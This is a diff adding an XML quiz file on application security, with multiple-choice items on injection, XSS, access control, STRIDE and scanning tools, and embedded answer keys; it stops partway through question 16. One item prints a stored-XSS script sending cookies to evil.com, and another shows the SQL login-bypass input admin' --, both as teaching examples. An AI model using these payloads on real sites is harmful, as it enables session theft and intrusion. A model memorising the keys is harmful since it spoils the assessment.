@@ -1,0 +1,1042 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<questestinterop xmlns="http://www.imsglobal.org/xsd/ims_qtiasiv1p2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.imsglobal.org/xsd/ims_qtiasiv1p2 http://www.imsglobal.org/profile/cc/ccv1p1/ccv1p1_qtiasiv1p2p1_v1p0.xsd">
+  <assessment ident="g35eafd381bf05d8f71f1c419b528e35" title="Quiz (M10): Application Security">
+    <qtimetadata>
+      <qtimetadatafield>
+        <fieldlabel>cc_profile</fieldlabel>
+        <fieldentry>cc.exam.v0p1</fieldentry>
+      </qtimetadatafield>
+      <qtimetadatafield>
+        <fieldlabel>qmd_assessmenttype</fieldlabel>
+        <fieldentry>Examination</fieldentry>
+      </qtimetadatafield>
+      <qtimetadatafield>
+        <fieldlabel>qmd_scoretype</fieldlabel>
+        <fieldentry>Percentage</fieldentry>
+      </qtimetadatafield>
+      <qtimetadatafield>
+        <fieldlabel>cc_maxattempts</fieldlabel>
+        <fieldentry>1</fieldentry>
+      </qtimetadatafield>
+    </qtimetadata>
+    <section ident="root_section">
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q01" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A developer writes the following Python code to authenticate users:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-python"&gt;query = &amp;quot;SELECT * FROM users WHERE user='&amp;quot; + username + &amp;quot;' AND pass='&amp;quot; + password + &amp;quot;'&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;A user enters the username &lt;code&gt;admin' --&lt;/code&gt; and any password. The user is authenticated as admin. What is the root cause of this vulnerability?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q01_a">
+                <material>
+                  <mattext texttype="text/plain">The application uses HTTPS instead of HTTP</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q01_b">
+                <material>
+                  <mattext texttype="text/plain">User-supplied input is concatenated into a SQL query without parameterization</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q01_c">
+                <material>
+                  <mattext texttype="text/plain">The application does not enforce password complexity requirements</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q01_d">
+                <material>
+                  <mattext texttype="text/plain">The application fails to implement MFA for admin accounts</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q01_b</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q02" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;Which of the following is the MOST effective defense against SQL injection?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q02_a">
+                <material>
+                  <mattext texttype="text/plain">Input validation that blocks single quote characters</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q02_b">
+                <material>
+                  <mattext texttype="text/plain">A web application firewall configured with SQL injection rules</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q02_c">
+                <material>
+                  <mattext texttype="text/plain">Parameterized queries (prepared statements)</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q02_d">
+                <material>
+                  <mattext texttype="text/plain">Database connection encryption using TLS</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q02_c</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q03" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A web application reflects a user's search query back in the HTML page without encoding it. An attacker crafts a URL with a malicious script payload and sends it to a victim. When the victim clicks the link, the script executes in their browser. What type of attack is this?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q03_a">
+                <material>
+                  <mattext texttype="text/plain">Stored XSS</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q03_b">
+                <material>
+                  <mattext texttype="text/plain">Reflected XSS</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q03_c">
+                <material>
+                  <mattext texttype="text/plain">DOM-based XSS</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q03_d">
+                <material>
+                  <mattext texttype="text/plain">CSRF (Cross-Site Request Forgery)</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q03_b</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q04" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A content management system stores user-submitted blog post comments in a database and displays them to all visitors without sanitization. An attacker submits a comment containing &lt;code&gt;&amp;lt;script&amp;gt;document.location='https://evil.com/?c='+document.cookie&amp;lt;/script&amp;gt;&lt;/code&gt;. Every visitor who views the post has their session cookie stolen. What type of attack is this?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q04_a">
+                <material>
+                  <mattext texttype="text/plain">Reflected XSS</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q04_b">
+                <material>
+                  <mattext texttype="text/plain">Stored XSS</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q04_c">
+                <material>
+                  <mattext texttype="text/plain">SQL injection</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q04_d">
+                <material>
+                  <mattext texttype="text/plain">CSRF</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q04_b</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q05" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A security engineer adds the following HTTP response header to the application:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Content-Security-Policy: default-src 'self'; script-src 'self'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;What does this header accomplish?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q05_a">
+                <material>
+                  <mattext texttype="text/plain">It forces all connections to use HTTPS</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q05_b">
+                <material>
+                  <mattext texttype="text/plain">It prevents the browser from executing scripts loaded from external domains</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q05_c">
+                <material>
+                  <mattext texttype="text/plain">It prevents SQL injection attacks by blocking special characters</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q05_d">
+                <material>
+                  <mattext texttype="text/plain">It encrypts the session cookie</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q05_b</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q06" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A user profile page at &lt;code&gt;https://app.example.com/profile?id=1042&lt;/code&gt; allows the authenticated user to view their profile. By changing the &lt;code&gt;id&lt;/code&gt; parameter to &lt;code&gt;1043&lt;/code&gt;, the user can view another user's profile. What vulnerability is present?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q06_a">
+                <material>
+                  <mattext texttype="text/plain">SQL injection</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q06_b">
+                <material>
+                  <mattext texttype="text/plain">Reflected XSS</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q06_c">
+                <material>
+                  <mattext texttype="text/plain">Insecure Direct Object Reference (IDOR)</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q06_d">
+                <material>
+                  <mattext texttype="text/plain">Session fixation</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q06_c</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q07" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A security architect is reviewing a login form. The form displays the error message "No account found for that email address" when an unregistered email is submitted. What STRIDE threat category does this behavior exemplify?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q07_a">
+                <material>
+                  <mattext texttype="text/plain">Spoofing</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q07_b">
+                <material>
+                  <mattext texttype="text/plain">Tampering</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q07_c">
+                <material>
+                  <mattext texttype="text/plain">Information Disclosure</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q07_d">
+                <material>
+                  <mattext texttype="text/plain">Elevation of Privilege</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q07_c</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q08" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;During a threat modeling session, the team identifies that an attacker could modify a payment amount in transit between the user's browser and the payment API. Which STRIDE category describes this threat?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q08_a">
+                <material>
+                  <mattext texttype="text/plain">Spoofing</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q08_b">
+                <material>
+                  <mattext texttype="text/plain">Tampering</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q08_c">
+                <material>
+                  <mattext texttype="text/plain">Repudiation</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q08_d">
+                <material>
+                  <mattext texttype="text/plain">Denial of Service</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q08_b</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q09" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;An organization wants to scan application source code for security vulnerabilities during every pull request before code is merged. Which tool category is MOST appropriate?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q09_a">
+                <material>
+                  <mattext texttype="text/plain">DAST</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q09_b">
+                <material>
+                  <mattext texttype="text/plain">SAST</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q09_c">
+                <material>
+                  <mattext texttype="text/plain">IAST</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q09_d">
+                <material>
+                  <mattext texttype="text/plain">Network vulnerability scanner</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q09_b</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q10" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A SAST scan reports 450 findings across a large codebase. The development team complains that 80% of the findings are in code paths that are never actually executed or receive user input. What SAST limitation does this illustrate?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q10_a">
+                <material>
+                  <mattext texttype="text/plain">SAST cannot analyze compiled code</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q10_b">
+                <material>
+                  <mattext texttype="text/plain">SAST requires application execution to find runtime vulnerabilities</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q10_c">
+                <material>
+                  <mattext texttype="text/plain">SAST has a high false positive rate due to lack of runtime context</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q10_d">
+                <material>
+                  <mattext texttype="text/plain">SAST tools cannot scan JavaScript or Python code</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q10_c</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q11" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A security team wants to identify vulnerabilities in a running web application's authentication mechanism, including missing security headers and session token weaknesses, without access to the source code. Which tool type is MOST appropriate?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q11_a">
+                <material>
+                  <mattext texttype="text/plain">SAST</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q11_b">
+                <material>
+                  <mattext texttype="text/plain">SCA</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q11_c">
+                <material>
+                  <mattext texttype="text/plain">DAST</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q11_d">
+                <material>
+                  <mattext texttype="text/plain">IAST</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q11_c</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q12" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A developer discovers that the &lt;code&gt;log4j&lt;/code&gt; library in their Java application is affected by the Log4Shell vulnerability (CVE-2021-44228). Which tool category would have detected this vulnerable library before deployment?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q12_a">
+                <material>
+                  <mattext texttype="text/plain">DAST</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q12_b">
+                <material>
+                  <mattext texttype="text/plain">SCA (Software Composition Analysis)</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q12_c">
+                <material>
+                  <mattext texttype="text/plain">SAST</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q12_d">
+                <material>
+                  <mattext texttype="text/plain">IAST</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q12_b</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q13" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A security policy requires that passwords be stored in a way that is computationally expensive to reverse. Which algorithm is MOST appropriate for storing user passwords?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q13_a">
+                <material>
+                  <mattext texttype="text/plain">SHA-256 with salt</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q13_b">
+                <material>
+                  <mattext texttype="text/plain">MD5</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q13_c">
+                <material>
+                  <mattext texttype="text/plain">AES-256</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q13_d">
+                <material>
+                  <mattext texttype="text/plain">bcrypt with a cost factor of 12</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q13_d</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q14" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A developer stores a database connection string including the password in a file named &lt;code&gt;config.py&lt;/code&gt; that is committed to the public GitHub repository. Which secure coding principle was violated?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q14_a">
+                <material>
+                  <mattext texttype="text/plain">Least privilege</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q14_b">
+                <material>
+                  <mattext texttype="text/plain">Defense in depth</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q14_c">
+                <material>
+                  <mattext texttype="text/plain">No hardcoded secrets in source code</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q14_d">
+                <material>
+                  <mattext texttype="text/plain">Fail secure error handling</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q14_c</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q15" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A web application's error handler catches all exceptions and returns a detailed stack trace to the browser including database table names and SQL queries. Which STRIDE threat does this behavior facilitate?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q15_a">
+                <material>
+                  <mattext texttype="text/plain">Spoofing</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q15_b">
+                <material>
+                  <mattext texttype="text/plain">Tampering</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q15_c">
+                <material>
+                  <mattext texttype="text/plain">Information Disclosure</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q15_d">
+                <material>
+                  <mattext texttype="text/plain">Denial of Service</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q15_c</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q16" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;Which secure coding principle states that an application component should only have the access rights necessary to perform its specific function?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q16_a">
+                <material>
+                  <mattext texttype="text/plain">Defense in depth</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q16_b">
+                <material>
